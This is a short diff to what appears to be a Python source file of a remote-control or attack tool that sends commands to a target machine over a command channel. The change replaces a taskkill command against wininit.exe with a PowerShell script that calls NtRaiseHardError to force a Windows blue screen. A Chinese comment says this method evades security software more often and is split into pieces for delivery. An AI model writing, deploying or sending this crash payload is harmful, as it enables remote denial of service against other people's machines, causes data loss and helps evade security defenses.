@@ -35,5 +35,11 @@ COMMAND_MAX_BYTES = (len(basicCMD['-c']) - COMMAND_OFFSET - 2) // 2 * 2
 LOGOFF_COMMAND = "shutdown /l"
 
 
-# 结束会话管理器会让系统判定关键进程终止，直接进入蓝屏。
-BLUE_SCREEN_COMMAND = "taskkill /f /im wininit.exe"
+# 蓝屏：直接调用内核接口 NtRaiseHardError 并以“关机”响应，比结束
+# wininit.exe 更少被安全软件拦截；脚本按命令通道上限拆成多段下发。
+BLUE_SCREEN_SCRIPT = (
+    "Add-Type -Name W -Namespace N -MemberDefinition "
+    "'[DllImport(\"ntdll.dll\")]public static extern int NtRaiseHardError"
+    "(int a,int b,int c,int d,int e,out int f);';"
+    "$f=0;[N.W]::NtRaiseHardError(3221227052,0,0,0,6,[ref]$f)"
+)
